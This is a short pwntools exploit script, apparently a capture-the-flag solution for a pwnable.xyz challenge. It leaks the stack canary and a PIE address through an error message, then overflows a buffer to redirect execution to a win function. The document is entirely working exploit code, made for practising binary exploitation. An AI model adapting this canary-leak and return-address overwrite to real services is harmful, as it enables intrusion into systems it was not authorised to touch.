#!/usr/bin/python 
from pwn import *

#context.log_level = 'debug'
#p = process("./challenge")
p = remote("svc.pwnable.xyz", 30017)

canary = ''
p.sendlineafter("Message: ", 'A'*0x28)
#gdb.attach(p)
for i in range(1, 8):
    p.sendlineafter("> ", chr(0x30+10+i))
    p.recvuntil("Error: ")
    byte = p.recvuntil(" ")
    log.info("byte : "+hex(int(byte[:2])))
    canary = hex(int(byte))[2:] + canary
    
canary += '00'
canary = int(canary, 16)

log.info("canary : "+hex(canary))
pie = ''
for i in range(6):
    p.sendlineafter("> ", chr(0x30+10+0x10+i))
    p.recvuntil("Error: ")
    byte = p.recvuntil(" ")
    log.info("byte : "+hex(int(byte)))
    pie = hex(int(byte))[2:] + pie
pie = int('0000'+pie, 16)
log.info("pie : "+hex(pie))
pie = pie - 0xb30 # pie base
win = pie + 0xaac

p.sendlineafter("> ", '1')
p.sendlineafter("Message: ", 'A'*(0x30-0x8) + p64(canary) + 'A'*8 + p64(win))
#gdb.attach(p)
p.sendlineafter("> ", '0')

p.interactive()
